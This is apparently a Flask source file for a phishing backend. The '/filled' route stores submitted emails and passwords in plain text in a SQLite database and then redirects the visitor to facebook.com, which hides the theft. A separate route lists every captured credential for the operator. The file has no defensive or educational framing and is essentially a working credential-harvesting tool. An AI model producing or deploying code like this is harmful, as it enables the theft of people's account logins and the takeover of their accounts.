from flask import Flask, render_template, redirect, request
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime

app= Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'

db = SQLAlchemy(app)

class Users(db.Model):
	id = db.Column(db.Integer, primary_key=True)
	name = db.Column(db.String(200))
	password = db.Column(db.String(200))
	date_created=db.Column(db.DateTime, default=datetime.utcnow)

	def __repr__(self):
		return '<Name %r>' % self.id
lst=[]

@app.route('/')
def index():
	return render_template("index.html")

@app.route('/filled', methods=["POST"])
def form():
	global lst
	email= request.form.get("emailwow")
	password= request.form.get("passwow")
	new_user=Users(name=email, password=password)
	db.session.add(new_user)
	db.session.commit()

	return redirect("https://www.facebook.com/")

@app.route('/soubhik')
def lepakar():
	users = Users.query.order_by(Users.date_created.desc())
	return render_template("data.html", users=users)

if __name__ =="__main__":
	app.run(debug=True)